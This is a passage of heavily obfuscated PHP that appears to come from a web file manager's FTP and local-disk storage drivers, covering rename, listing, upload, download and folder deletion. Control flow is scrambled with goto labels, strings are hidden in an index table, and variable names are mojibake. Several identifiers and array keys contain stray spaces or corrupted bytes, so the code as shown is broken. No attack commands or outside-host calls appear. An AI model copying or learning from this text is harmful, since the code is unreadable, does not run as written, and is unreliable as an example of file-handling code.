$e±¶¼ŞÊÌ = $this->iconvSystem($c‹ìùôÍÚÍ[$_SERVER[±á õÁ][38]]); $AÉÃ„ŠÙï¹ = @ftp_delete($this->connect, $e±¶¼ŞÊÌ); if (!$AÉÃ„ŠÙï¹) { return !1; } } goto E¹ÄÉ¹½Ø; C­ºÑ‡¾’â: } public function rename($C·ˆ«›±×‰, $fÑÕ­­—®õ) { goto få—Äò¼¦; A‹÷Åó†°: $cÙ¾¼êÕ¦ = $this->iconvSystem($cÙ¾¼êÕ¦); $C·ˆ«›±×‰ = $this->iconvSystem($C·ˆ«›±×‰); $Fèì¼»Ü‹ = $this->pathFather($C·ˆ«›±×‰); goto Föåš‚°¸·; EòÌ¬íÊñ¹: return $fÏĞ¬ëº¤ ? $this->getPathOuter($E‡óé²ó·´) : !1; goto CÛÕØ•¯Œ; Föåš‚°¸·: $E‡óé²ó·´ = rtrim($Fèì¼»Ü‹, $c¬¨¸çÔàí[8]) . $c¬¨¸çÔàí[8] . $cÙ¾¼êÕ¦; $fÏĞ¬ëº¤ = @ftp_rename($this->connect, $C·ˆ«›±×‰, $E‡óé²ó·´); $E‡óé²ó·´ = $this->iconvApp($E‡óé²ó·´); goto EòÌ¬íÊñ¹; få—Äò¼¦: $c¬¨¸çÔàí =& $_SERVER[±á õÁ]; if (!$this->_isconn()) { return !1; } $cÙ¾¼êÕ¦ = $this->fileNameAuto($this->pathFather($C·ˆ«›±×‰), $fÑÕ­­—®õ); goto A‹÷Åó†°; CÛÕØ•¯Œ: } private function folderInfo($DÍ²ô®ÔÂ–, $dšËò›º‹ = false) { $Bšƒ§¸îõ =& $_SERVER[±á õÁ]; $A¾«ë½é = array($Bšƒ§¸îõ[38] => $this->pathThis($DÍ²ô®ÔÂ–), $Bšƒ§¸îõ[85] => $this->getPathOuter($Bšƒ§¸îõ[8] . $DÍ²ô®ÔÂ–), $Bšƒ§¸îõ[39] => $Bšƒ§¸îõ[86]); if ($dšËò›º‹) { return $A¾«ë½é; } $A¾«ë½é[$Bšƒ§¸îõ[200]] = $A¾«ë½é[$Bšƒ§¸îõ[117]] = 0; $A¾«ë½é[$Bšƒ§¸îõ[201]] = $A¾«ë½é[$Bšƒ§¸îõ[202]] = !0; return $A¾«ë½é; } private function fileInfo($F°Ö¨Àƒ¡Ÿ, $EªÎëÕªÆ = false, $BğÓÖ†…Öù = array()) { goto Cì¶­ÆĞê´; Cì¶­ÆĞê´: $bƒØ§ò…ˆí =& $_SERVER[±á õÁ]; $fÈŸ§æë ‚ = array($bƒØ§ò…ˆí[38] => $this->pathThis($F°Ö¨Àƒ¡Ÿ), $bƒØ§ò…ˆí[85] => $this->getPathOuter($bƒØ§ò…ˆí[8] . $F°Ö¨Àƒ¡Ÿ), $bƒØ§ò…ˆí[39] => $bƒØ§ò…ˆí[181], $bƒØ§ò…ˆí[87] => isset($BğÓÖ†…Öù[$bƒØ§ò…ˆí[87]]) ? $BğÓÖ†…Öù[$bƒØ§ò…ˆí[87]] : 0, $bƒØ§ò…ˆí[175] => $this->ext($F°Ö¨Àƒ¡Ÿ)); if ($EªÎëÕªÆ) { return $fÈŸ§æë ‚; } goto BÊ‹÷”àë¢; BÊ‹÷”àë¢: $fÈŸ§æë ‚[$bƒØ§ò…ˆí[200]] = $fÈŸ§æë ‚[$bƒØ§ò…ˆí[117]] = 0; $fÈŸ§æë ‚[$bƒØ§ò…ˆí[201]] = $fÈŸ§æë ‚[$bƒØ§ò…ˆí[202]] = !0; $F…©ñÀ—Ó = $this->iconvSystem($F°Ö¨Àƒ¡Ÿ); goto C™Ë¾éíË¯; C™Ë¾éíË¯: $fÈŸ§æë ‚[$bƒØ§ò…ˆí[117]] = @ftp_mdtm($this->connect, $F…©ñÀ—Ó); if (empty($BğÓÖ†…Öù)) { $BğÓÖ†…Öù = $this->objectMeta($F°Ö¨Àƒ¡Ÿ); if (!$BğÓÖ†…Öù) { return $fÈŸ§æë ‚; } } $fÈŸ§æë ‚[$bƒØ§ò…ˆí[87]] = $BğÓÖ†…Öù[$bƒØ§ò…ˆí[87]]; goto d–Å§ÈÆãØ; d–Å§ÈÆãØ: return $fÈŸ§æë ‚; goto f¦œÃÀİñ; f¦œÃÀİñ: } public function size($dÓ®«§ªåé) { $Càè’‹Åç¤ = $this->objectMeta($dÓ®«§ªåé); return $Càè’‹Åç¤ ? $Càè’‹Åç¤[$_SERVER[±á õÁ][87]] : 0; } public function info($bˆôÄ½ÄÀã) { if ($this->isFile($bˆôÄ½ÄÀã)) { return $this->fileInfo($bˆôÄ½ÄÀã, 0); } else { if ($this->isFolder($bˆôÄ½ÄÀã)) { return $this->folderInfo($bˆôÄ½ÄÀã); } } return !1; } private function fileList($eâì™Ñì‹, &$A¤é´íïÀ, &$D×ÌÁó–ƒ, $dÎ¼‚íÆöÍ = false) { goto fƒàÛØ³Œ‹; c¿Şİæ‹Ï: @ftp_chdir($this->connect, $f¬­ñï­Šæ[8]); $eâì™Ñì‹ = rtrim($eâì™Ñì‹, $f¬­ñï­Šæ[8]) . $f¬­ñï­Šæ[8]; check_abort(); goto c™¥ëÁƒÖÎ; c™¥ëÁƒÖÎ: $bĞ˜°ÇÛ½² = $this->listItemCache === !1 ? !1 : !0; $E°ÙãâÌ‡ = @ftp_rawlist($this->connect, $eâì™Ñì‹); if (!$E°ÙãâÌ‡) { $E°ÙãâÌ‡ = array(); } goto d‰—çµ—Ç; fƒàÛØ³Œ‹: $f¬­ñï­Šæ =& $_SERVER[±á õÁ]; $eâì™Ñì‹ = $this->iconvSystem($eâì™Ñì‹); if (!$this->isFolder($eâì™Ñì‹)) { return !1; } goto c¿Şİæ‹Ï; d‰—çµ—Ç: $FíõÏé‘ = array($f¬­ñï­Šæ[101] => 1, $f¬­ñï­Šæ[1183] => 1); foreach ($E°ÙãâÌ‡ as $D†å¸ÏäŞ) { goto c¢ŒéÕ´Ú; c¢ŒéÕ´Ú: $e°¯½¨ù˜ = $this->_listItem($D†å¸ÏäŞ); if ($e°¯½¨ù˜[0] == $f¬­ñï­Šæ[720]) { continue; } $aØˆ¾ëÓàŸ = $e°¯½¨ù˜[8]; goto B«é¾É¢Û; EÑã‡Šº—: if ($aä¢°»‰¥ã) { $A¤é´íïÀ[] = $aØˆ¾ëÓàŸ; if ($dÎ¼‚íÆöÍ) { $this->fileList($aØˆ¾ëÓàŸ, $A¤é´íïÀ, $D×ÌÁó–ƒ, $dÎ¼‚íÆöÍ); } continue; } $D×ÌÁó–ƒ[] = $A†³ï¦ë‹; goto e½®‚ ÂŠÛ; Bğà÷¥îíÇ: if (substr($D†å¸ÏäŞ, 0, 1) == $f¬­ñï­Šæ[1184]) { $A†³ï¦ë‹[$f¬­ñï­Šæ[39]] = $f¬­ñï­Šæ[86]; $A†³ï¦ë‹[$f¬­ñï­Šæ[87]] = 0; } $aä¢°»‰¥ã = $A†³ï¦ë‹[$f¬­ñï­Šæ[39]] == $f¬­ñï­Šæ[86] ? !0 : !1; if ($bĞ˜°ÇÛ½²) { $this->cacheMethod($f¬­ñï­Šæ[205], $aØˆ¾ëÓàŸ, $aä¢°»‰¥ã); $this->cacheMethod($f¬­ñï­Šæ[206], $aØˆ¾ëÓàŸ, $A†³ï¦ë‹); } goto EÑã‡Šº—; B«é¾É¢Û: if (!$aØˆ¾ëÓàŸ || isset($FíõÏé‘[$aØˆ¾ëÓàŸ])) { continue; } $aØˆ¾ëÓàŸ = $this->iconvApp($eâì™Ñì‹ . ltrim($aØˆ¾ëÓàŸ, $f¬­ñï­Šæ[8])); $A†³ï¦ë‹ = array($f¬­ñï­Šæ[38] => $aØˆ¾ëÓàŸ, $f¬­ñï­Šæ[39] => $f¬­ñï­Šæ[181], $f¬­ñï­Šæ[87] => $e°¯½¨ù˜[4]); goto Bğà÷¥îíÇ; e½®‚ ÂŠÛ: } if ($bĞ˜°ÇÛ½²) { $this->cacheMethod($f¬­ñï­Šæ[205], $eâì™Ñì‹, !0); } goto e¯ˆ‚ µÏÀ; e¯ˆ‚ µÏÀ: } private function _listItem($Fì¬‹÷‚İ×) { if (empty($Fì¬‹÷‚İ×)) { return array(); } $a‡…ÎİîÛ = preg_split($_SERVER[±á õÁ][1185], $Fì¬‹÷‚İ×); if (count($a‡…ÎİîÛ) <= 9) { return $a‡…ÎİîÛ; } $a‡…ÎİîÛ[8] = trim(substr($Fì¬‹÷‚İ×, strpos($Fì¬‹÷‚İ×, $a‡…ÎİîÛ[7]) + strlen($a‡…ÎİîÛ[7]))); return array_splice($a‡…ÎİîÛ, 0, 9); } public function listPath($bÕòÙÆ©ç, $fîô‚ØÄ÷¨ = false) { goto dœé±ï‡•´; DŒÉ¨·ŒŒº: $this->fileList($bÕòÙÆ©ç, $aèË«¯´ŒË, $C˜„œ´™«Ü); foreach ($aèË«¯´ŒË as $eá¿—ÄåŸÛ => $A—÷í î) { $aèË«¯´ŒË[$eá¿—ÄåŸÛ] = $this->folderInfo($A—÷í î, $fîô‚ØÄ÷¨); } foreach ($C˜„œ´™«Ü as $eá¿—ÄåŸÛ => $A—÷í î) { $C˜„œ´™«Ü[$eá¿—ÄåŸÛ] = $this->fileInfo($A—÷í î[$cØ„ÃÀ„Û[38]], $fîô‚ØÄ÷¨, $A—÷í î); } goto e ±ĞÂ²è; e ±ĞÂ²è: return array($cØ„ÃÀ„Û[84] => $aèË«¯´ŒË, $cØ„ÃÀ„Û[83] => $C˜„œ´™«Ü); goto d¯Ò‘Â„³Ì; dœé±ï‡•´: $cØ„ÃÀ„Û =& $_SERVER[±á õÁ]; if (!$this->_isconn()) { return !1; } $aèË«¯´ŒË = $C˜„œ´™«Ü = array(); goto DŒÉ¨·ŒŒº; d¯Ò‘Â„³Ì: } public function has($D¼Òƒ»àò, $BÀìÕŠ½ÅÒ = false, $fİ¶¦…ÈÛ² = true) { goto Dç¦Ø–Æ‹²; E÷‡ØÍ²“‹: return !1; goto DÂ…È¾Íà; EÄÔ¶öà›¶: $this->fileList($D¼Òƒ»àò, $BÜØç»Ôâ, $D¶øŠ™½²¡, $d¬®¢ãÅè™); if ($BÀìÕŠ½ÅÒ) { return array($c‘Ôá²ç´[209] => count($D¶øŠ™½²¡), $c‘Ôá²ç´[210] => count($BÜØç»Ôâ)); } if ($fİ¶¦…ÈÛ²) { if (count($D¶øŠ™½²¡)) { return !0; } } else { if (count($BÜØç»Ôâ)) { return !0; } } goto E÷‡ØÍ²“‹; Dç¦Ø–Æ‹²: $c‘Ôá²ç´ =& $_SERVER[±á õÁ]; $BÜØç»Ôâ = $D¶øŠ™½²¡ = array(); $d¬®¢ãÅè™ = $BÀìÕŠ½ÅÒ ? !0 : !1; goto EÄÔ¶öà›¶; DÂ…È¾Íà: } public function listAll($E‡ŒÚ©ùÙ) { goto aˆšÃÔ–—; aˆšÃÔ–—: $f„¸ÁƒöÒ¾ =& $_SERVER[±á õÁ]; if (!$this->_isconn()) { return !1; } $DéÔõàƒ¿Ğ = $D†•°Ûâ“« = array(); goto cÛµéà®ŠŒ; A¹¤ø—¡ÈÖ: foreach ($DéÔõàƒ¿Ğ as $E¼„œ«½»†) { if (is_string($E¼„œ«½»†)) { $Cšï¡³ÛÂ[$E¼„œ«½»†] = 0; } } return $this->listAllFiles($E‡ŒÚ©ùÙ, array_keys($Cšï¡³ÛÂ), $Cšï¡³ÛÂ); goto EÔÃÉÕÒØ; cÛµéà®ŠŒ: $this->fileList($E‡ŒÚ©ùÙ, $DéÔõàƒ¿Ğ, $D†•°Ûâ“«, !0); $Cšï¡³ÛÂ = array(); foreach ($D†•°Ûâ“« as $E¼„œ«½»†) { $Cšï¡³ÛÂ[$E¼„œ«½»†[$f„¸ÁƒöÒ¾[38]]] = $E¼„œ«½»†[$f„¸ÁƒöÒ¾[87]]; } goto A¹¤ø—¡ÈÖ; EÔÃÉÕÒØ: } public function getContent($Fó‹‘Êµ¥ƒ) { if (!$this->_isconn()) { return !1; } $Fó‹‘Êµ¥ƒ = $this->iconvSystem($Fó‹‘Êµ¥ƒ); return $this->fileSubstr($Fó‹‘Êµ¥ƒ); } public function setContent($A»åñ­¨ë‰, $eº¹‹ˆç¨Œ = '') { goto BµöíãÑ°; BµöíãÑ°: if (!$this->_isconn()) { return !1; } $f°™¬²“¸ = $this->pathThis($this->iconvSystem($A»åñ­¨ë‰)); $C³ĞÀ’—©· = $this->tempFile($f°™¬²“¸); goto eÎèÙ©ÔçŒ; eÎèÙ©ÔçŒ: file_put_contents($C³ĞÀ’—©·, $eº¹‹ˆç¨Œ); $d–“ ƒ©Ú† = $this->upload($A»åñ­¨ë‰, $this->iconvApp($C³ĞÀ’—©·)); $this->tempFileRemve($C³ĞÀ’—©·); goto Bã¬îâ“ùí; Bã¬îâ“ùí: return $d–“ ƒ©Ú†; goto aæ”éŒõºÉ; aæ”éŒõºÉ: } public function fileSubstr($FŠáª„­È, $aæÈÕİ‰Ø— = 0, $Fõ¬›Úƒ ‘ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($FŠáª„­È, $aæÈÕİ‰Ø—, $Fõ¬›Úƒ ‘); } private function ftpRequest($CĞ…Ÿß·æ°, $BàÇÃã™Ë = 0, $b¶†¿ƒ«æ¾ = false) { goto AèùÊ¯ö…Ë; D—§œ¤À¶¾: curl_setopt($EÉä×¤‚Ï„, CURLOPT_RETURNTRANSFER, 1); $BÎØÑ‰Ôè = curl_exec($EÉä×¤‚Ï„); curl_close($EÉä×¤‚Ï„); goto F’ÊË¢Œ; F’ÊË¢Œ: return $BÎØÑ‰Ôè; goto d°ëÖó¼í¦; AèùÊ¯ö…Ë: $CĞ…Ÿß·æ° = $this->iconvSystem($CĞ…Ÿß·æ°); $C×ï…³À¼Ø = $this->scheme . $this->host . $_SERVER[±á õÁ][4] . $this->port; $EÉä×¤‚Ï„ = curl_init(); goto eœ´¯´ØÂÚ; eœ´¯´ØÂÚ: curl_setopt($EÉä×¤‚Ï„, CURLOPT_URL, $C×ï…³À¼Ø . $this->pathEncode($CĞ…Ÿß·æ°)); curl_setopt($EÉä×¤‚Ï„, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($b¶†¿ƒ«æ¾) { $e×êÚ—©å = $BàÇÃã™Ë + $b¶†¿ƒ«æ¾ - 1; curl_setopt($EÉä×¤‚Ï„, CURLOPT_RANGE, "{$BàÇÃã™Ë}\55{$e×êÚ—©å}"); } goto D—§œ¤À¶¾; d°ëÖó¼í¦: } public function upload($FŞóºÑÁÂ¦, $AİÔ®á†‘, $aÀÌç“Ûæ = false, $D»•ŒÂù = REPEAT_REPLACE) { goto EÎš «Úí; aªèè¡¥: $AİÔ®á†‘ = $this->iconvSystem($AİÔ®á†‘); $DÌĞ‡œ‘ ø = ftp_nb_put($this->connect, $FŞóºÑÁÂ¦, $AİÔ®á†‘, FTP_BINARY); while ($DÌĞ‡œ‘ ø == FTP_MOREDATA) { $DÌĞ‡œ‘ ø = ftp_nb_continue($this->connect); } goto CåÑ”Ò…ê; CåÑ”Ò…ê: if ($DÌĞ‡œ‘ ø != FTP_FINISHED) { return !1; } return $this->getPathOuter($FŞóºÑÁÂ¦); goto d¨–šÀ­ñ¾; EÎš «Úí: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FŞóºÑÁÂ¦))) { return !1; } $FŞóºÑÁÂ¦ = $this->iconvSystem($FŞóºÑÁÂ¦); goto aªèè¡¥; d¨–šÀ­ñ¾: } public function download($f·òí˜µ†ê, $bÏ¸‰•…Â¿ = '') { goto AŠÁõâˆ; eöœëøƒ×Û: while ($D›ÁÀîˆøç == FTP_MOREDATA) { $D›ÁÀîˆøç = ftp_nb_continue($this->connect); } if ($D›ÁÀîˆøç != FTP_FINISHED) { return !1; } return $this->iconvApp($bÏ¸‰•…Â¿); goto CÕìøä¾Û˜; AŠÁõâˆ: if (!$this->_isconn()) { return !1; } $AÚğäõÁ‘ = $this->pathFather($bÏ¸‰•…Â¿); if (!IO::mkdir($AÚğäõÁ‘)) { return !1; } goto Bğ’Úë¯ŒÊ; Bğ’Úë¯ŒÊ: $f·òí˜µ†ê = $this->iconvSystem($f·òí˜µ†ê); $bÏ¸‰•…Â¿ = $this->iconvSystem($bÏ¸‰•…Â¿); $D›ÁÀîˆøç = ftp_nb_get($this->connect, $bÏ¸‰•…Â¿, $f·òí˜µ†ê, FTP_BINARY); goto eöœëøƒ×Û; CÕìøä¾Û˜: } public function exist($b‰Í¨¿Ã½ø) { return $this->isFile($b‰Í¨¿Ã½ø) || $this->isFolder($b‰Í¨¿Ã½ø); } public function isFile($DÒÕÒ›äµí) { return !$this->isFolder($DÒÕÒ›äµí) && $this->objectMeta($DÒÕÒ›äµí); } public function isFolder($d¢“Ù¿ïÖ) { return $this->cacheMethod($_SERVER[±á õÁ][205], $d¢“Ù¿ïÖ); } protected function objectMeta($F¸ô¾ó½Š‘) { return $this->cacheMethod($_SERVER[±á õÁ][206], $F¸ô¾ó½Š‘); } protected function _objectMeta($FÕÖÜ«ì¼) { goto bºÉÃ Æ‰¶; eëˆãòÈ°±: $FÕÖÜ«ì¼ = $this->iconvSystem($FÕÖÜ«ì¼); $Aé£­»‡‰¢ = array($Fö¢ˆçå—®[38] => $this->iconvApp($FÕÖÜ«ì¼), $Fö¢ˆçå—®[39] => $Fö¢ˆçå—®[181], $Fö¢ˆçå—®[87] => 0); @ftp_chdir($this->connect, $Fö¢ˆçå—®[8]); goto D‘ñ©°óè; bºÉÃ Æ‰¶: $Fö¢ˆçå—® =& $_SERVER[±á õÁ]; if ($FÕÖÜ«ì¼ == $Fö¢ˆçå—®[43] || $FÕÖÜ«ì¼ == $Fö¢ˆçå—®[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto eëˆãòÈ°±; D‘ñ©°óè: $CÊ‚¹²áµ§ = @ftp_size($this->connect, $FÕÖÜ«ì¼); if ($CÊ‚¹²áµ§ != -1) { $Aé£­»‡‰¢[$Fö¢ˆçå—®[87]] = $CÊ‚¹²áµ§; } else { $b‘ĞºßêÌí = @ftp_chdir($this->connect, $FÕÖÜ«ì¼); if (!$b‘ĞºßêÌí) { return !1; } $Aé£­»‡‰¢[$Fö¢ˆçå—®[39]] = $Fö¢ˆçå—®[86]; } return $Aé£­»‡‰¢; goto eˆÒ“ºÏ¹á; eˆÒ“ºÏ¹á: } protected function _isFolder($E…î²æÖä) { $AœÍ®óùåƒ =& $_SERVER[±á õÁ]; if ($E…î²æÖä == $AœÍ®óùåƒ[43] || $E…î²æÖä == $AœÍ®óùåƒ[8]) { return !0; } $C•İëÕº Ã = $this->objectMeta($E…î²æÖä); return isset($C•İëÕº Ã[$AœÍ®óùåƒ[39]]) && $C•İëÕº Ã[$AœÍ®óùåƒ[39]] == $AœÍ®óùåƒ[86] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($F´å¯™¿¢) { if (substr($F´å¯™¿¢, 0, 2) == $_SERVER[±á õÁ][1176]) { $F´å¯™¿¢ = BASIC_PATH . substr($F´å¯™¿¢, 2); } return $F´å¯™¿¢; } public function iconvApp($cæã‚È“óõ) { $Fàê‰½·Ş² =& $_SERVER[±á õÁ]; global $config; return $this->iconvTo($cæã‚È“óõ, $config[$Fàê‰½·Ş²[1174]], $config[$Fàê‰½·Ş²[1173]]); } public function iconvSystem($C«¸¶œùÈ·) { $b·¼…ù¥Â• =& $_SERVER[±á õÁ]; global $config; return $this->iconvTo($C«¸¶œùÈ·, $config[$b·¼…ù¥Â•[1173]], $config[$b·¼…ù¥Â•[1174]]); } public function getPathOuter($B¬Ö¸à‘Çˆ) { goto dˆ„ğöÙ÷‡; f˜ùÙíàÇŠ: if (substr($eÕª´Ú·á¤, 0, 2) == $b‹ ×¸ÀÏ–[1176]) { $eÕª´Ú·á¤ = BASIC_PATH . substr($eÕª´Ú·á¤, 2); } if (substr($B¬Ö¸à‘Çˆ, 0, 2) == $b‹ ×¸ÀÏ–[1176]) { $B¬Ö¸à‘Çˆ = BASIC_PATH . substr($B¬Ö¸à‘Çˆ, 2); } $eÕª´Ú·á¤ = KodIO::clear($eÕª´Ú·á¤); goto C±åéœËœ; då›Ï‹ø„¦: return $this->pathDriver . $b‹ ×¸ÀÏ–[8] . ltrim($B¬Ö¸à‘Çˆ, $b‹ ×¸ÀÏ–[8]); goto dª‰çº¾ß»; dˆ„ğöÙ÷‡: $b‹ ×¸ÀÏ– =& $_SERVER[±á õÁ]; $eÕª´Ú·á¤ = $this->iconvApp($this->pathBase); $B¬Ö¸à‘Çˆ = $this->iconvApp($B¬Ö¸à‘Çˆ); goto f˜ùÙíàÇŠ; C±åéœËœ: $B¬Ö¸à‘Çˆ = KodIO::clear($B¬Ö¸à‘Çˆ); $B¬Ö¸à‘Çˆ = substr($B¬Ö¸à‘Çˆ, strlen($eÕª´Ú·á¤)); if (empty($this->pathDriver)) { return $B¬Ö¸à‘Çˆ; } goto då›Ï‹ø„¦; dª‰çº¾ß»: } public function mkfile($C…‘ÅÎé, $CóÜªŸ½·Ù = '', $E §Ã›ùÈ½ = REPEAT_RENAME) { $C…‘ÅÎé = $this->iconvSystem($C…‘ÅÎé); @touch($C…‘ÅÎé); if ($CóÜªŸ½·Ù) { file_put_contents($C…‘ÅÎé, $CóÜªŸ½·Ù); } return is_file($C…‘ÅÎé) ? $this->getPathOuter($C…‘ÅÎé) : !1; } public function mkdir($Fø­‰Í—¹, $CÆÚ¡Éâ÷± = REPEAT_SKIP) { $Fø­‰Í—¹ = $this->iconvSystem($Fø­‰Í—¹); if (is_dir($Fø­‰Í—¹)) { return $this->getPathOuter($Fø­‰Í—¹); } @mkdir($Fø­‰Í—¹, 511, !0); return is_dir($Fø­‰Í—¹) ? $this->getPathOuter($Fø­‰Í—¹) : !1; } public function copyFile($c·‘ÚÙË¿Ü, $A‘ô×¡‰±) { $this->mkdir($this->pathFather($A‘ô×¡‰±)); $c·‘ÚÙË¿Ü = $this->iconvSystem($c·‘ÚÙË¿Ü); $A‘ô×¡‰± = $this->iconvSystem($A‘ô×¡‰±); $f–õÎ’í’ = copy_64($c·‘ÚÙË¿Ü, $A‘ô×¡‰±); return $f–õÎ’í’ ? $this->getPathOuter($A‘ô×¡‰±) : !1; } public function moveFile($A§ë®æĞâ, $BãÔ¼Å·Â¾) { $this->mkdir($this->pathFather($BãÔ¼Å·Â¾)); $A§ë®æĞâ = $this->iconvSystem($A§ë®æĞâ); $BãÔ¼Å·Â¾ = $this->iconvSystem($BãÔ¼Å·Â¾); $EÑö»è±ƒ = intval(@rename($A§ë®æĞâ, $BãÔ¼Å·Â¾)); if (!$EÑö»è±ƒ) { if ($EÑö»è±ƒ = intval(@copy_64($A§ë®æĞâ, $BãÔ¼Å·Â¾))) { @unlink($A§ë®æĞâ); } } return $EÑö»è±ƒ ? $this->getPathOuter($BãÔ¼Å·Â¾) : !1; } public function delFile($e¼†éÌÛ) { $e¼†éÌÛ = $this->iconvSystem($e¼†éÌÛ); if (!@unlink($e¼†éÌÛ)) { @chmod($e¼†éÌÛ, 511); if (!@unlink($e¼†éÌÛ)) { return !1; } } else { return !0; } } public function delFolder($c©ÙŸ¿ŠÁ—) { goto D†‹¯ñ© Ù; D†‹¯ñ© Ù: $b·®ÕÑîÛà =& $_SERVER[±á õÁ]; $c©ÙŸ¿ŠÁ— = $this->iconvSystem($c©ÙŸ¿ŠÁ—); if (!is_dir($c©ÙŸ¿ŠÁ—)) { return !0; } goto dº´£’¶ğî; c÷Ö¡ÛÜ×¥: return rmdir($c©ÙŸ¿ŠÁ—); goto C¬™ÜâÅ†™; dº´£’¶ğî: if (!($cô³ÀÛà÷ = opendir($c©ÙŸ¿ŠÁ—))) { return !1; } while (($b¨ÕÃø¸è³ = readdir($cô³ÀÛà÷)) !== !1) { if ($b¨ÕÃø¸è³ == $b·®ÕÑîÛà[101] || $b¨ÕÃø¸è³ == $b·®ÕÑîÛà[1183]) { continue; } $fôÂ¾‰Û‘¢ = $c©ÙŸ¿ŠÁ— . $b·®ÕÑîÛà[8] . $b¨ÕÃø¸è³; if (is_file($fôÂ¾‰Û‘¢) || is_link($fôÂ¾‰Û‘¢)) { if (!unlink($fôÂ¾‰Û‘¢)) { chmod($fôÂ¾‰Û‘¢, 511); if (!unlink($fôÂ¾‰Û‘¢)) { return !1; } } } else { if (is_dir($fôÂ¾‰Û‘¢)) { chmod($fôÂ¾‰Û‘¢, 511); $fôÂ¾‰Û‘¢ = $this->iconvApp($fôÂ¾‰Û‘¢); if (!$this->delFolder($fôÂ¾‰Û‘¢)) { return !1; } } } } closedir($cô³ÀÛà÷); goto c÷Ö¡ÛÜ×¥; C¬™ÜâÅ†™: } public function rename($EàÖµİ»‘×, $cœ´°ªÁö) { goto FĞìÇÇÂÍ¤; FĞìÇÇÂÍ¤: $E‚•Ñ«¦Ù¤ =& $_SERVER[±á õÁ]; $EÔ™»Ş¿± = $this->fileNameAuto($this->pathFather($EàÖµİ»‘×), $cœ´°ªÁö); $EÔ™»Ş¿± = $this->iconvSystem($EÔ™»Ş¿±); goto eêÀããŠÆÏ; Få¨©–³§½: $aËğ¿‹ê¯á = @rename($EàÖµİ»‘×, $f‰Ä§ÎÃ†); $f‰Ä§ÎÃ† = $this->iconvApp($f‰Ä§ÎÃ†); return $aËğ¿‹ê¯á ? $this->getPathOuter($f‰Ä§ÎÃ†) : !1; goto fğËé¹µ³; eêÀããŠÆÏ: $EàÖµİ»‘× = $this->iconvSystem($EàÖµİ»‘×); $B‘ó¥•± = $this->pathFather($EàÖµİ»‘×); $f‰Ä§ÎÃ† = rtrim($B‘ó¥•±, $E‚•Ñ«¦Ù¤[8]) . $E‚•Ñ«¦Ù¤[8] . $EÔ™»Ş¿±; goto Få¨©–³§½; fğËé¹µ³: } public function size($aß¼º¸ÏòÉ) { $aß¼º¸ÏòÉ = $this->iconvSystem($aß¼º¸ÏòÉ); return filesize_64($aß¼º¸ÏòÉ); } public function info($e¬®Ÿ¦õ–±) { $e¬®Ÿ¦õ–± = $this->iconvSystem($e¬®Ÿ¦õ–±); if ($this->isFolder($e¬®Ÿ¦õ–±)) { return $this->folderInfo($e¬®Ÿ¦õ–±); } else { if ($this->isFile($e¬®Ÿ¦õ–±)) { return $this->fileInfo($e¬®Ÿ¦õ–±); } } return !1; } protected function infoChildren($bò‚ùÛ…³—, &$fÒ‹ø­„ø, $DŠö‡¨ö¿ = true) { goto bšßî”ßÂ±; F‡«¢ŒƒòÓ: closedir($eºñ¨ÆÜÙÓ); goto Cø÷…Á÷Æ; bšßî”ßÂ±: $C—…ùù¿â› =& $_SERVER[±á õÁ]; check_abort(); $bò‚ùÛ…³— = rtrim($bò‚ùÛ…³—, $C—…ùù¿â›[8]) . $C—…ùù¿â›[8]; goto Cà”©ğ›Ú‘; Cà”©ğ›Ú‘: if ($DŠö‡¨ö¿) { $bò‚ùÛ…³— = $this->iconvSystem($bò‚ùÛ…³—); } if (!($eºñ¨ÆÜÙÓ = @opendir($bò‚ùÛ…³—))) { return; } while (($a¾Ô‹§†ïÍ = readdir($eºñ¨ÆÜÙÓ)) !== !1) { if ($a¾Ô‹§†ïÍ == $C—…ùù¿â›[101] || $a¾Ô‹§†ïÍ == $C—…ùù¿â›[1183]) { continue; } $Aö‹³“Š‘ğ = $bò‚ùÛ…³— . $a¾Ô‹§†ïÍ; if (is_file($Aö‹³“Š‘ğ) || is_link($Aö‹³“Š‘ğ)) { $fÒ‹ø­„ø[$C—…ùù¿â›[88]]++; $fÒ‹ø­„ø[$C—…ùù¿â›[87]] += filesize_64($Aö‹³“Š‘ğ); } else { if (is_dir($Aö‹³“Š‘ğ)) { $fÒ‹ø­„ø[$C—…ùù¿â›[89]]++; $this->infoChildren($Aö‹³“Š‘ğ, $fÒ‹ø­„ø, !1); } } } goto F‡«¢ŒƒòÓ; Cø÷…Á÷Æ: } private function folderInfo($A³ŸøˆèÎ¥, $CØ’–•Ÿ¾„ = false) { $F¬Ú™ŒªÙ =& $_SERVER[±á õÁ]; $A³ŸøˆèÎ¥ = rtrim($A³ŸøˆèÎ¥, $F¬Ú™ŒªÙ[8]) . $F¬Ú™ŒªÙ[8]; $B³óïùÖ»ï = $this->iconvApp($this->pathThis($A³ŸøˆèÎ¥)); if ($CØ’–•Ÿ¾„) { return array($F¬Ú™ŒªÙ[38] => $B³óïùÖ»ï, $F¬Ú™ŒªÙ[85] => $this->getPathOuter($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[39] => $F¬Ú™ŒªÙ[86]); } $dãìº†ñ¸Ğ = array($F¬Ú™ŒªÙ[38] => $B³óïùÖ»ï, $F¬Ú™ŒªÙ[85] => $this->getPathOuter($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[39] => $F¬Ú™ŒªÙ[86], $F¬Ú™ŒªÙ[200] => @filectime($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[117] => @filemtime($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[1186] => @fileatime($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[1187] => is_readable($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[1188] => is_writable($A³ŸøˆèÎ¥), $F¬Ú™ŒªÙ[1189] => get_mode($A³ŸøˆèÎ¥)); return $dãìº†ñ¸Ğ; } private function fileInfo($d„¹Œ¬¾’¤, $aËäÇ¢½Èª = false) { $Dï½‘ç£¿ =& $_SERVER[±á õÁ]; $F“¶Ë¹„…„ = $this->iconvApp($this->pathThis($d„¹Œ¬¾’¤)); if ($aËäÇ¢½Èª) { return array($Dï½‘ç£¿[38] => $F“¶Ë¹„…„, $Dï½‘ç£¿[85] => $this->getPathOuter($d„¹Œ¬¾’¤), $Dï½‘ç£¿[39] => 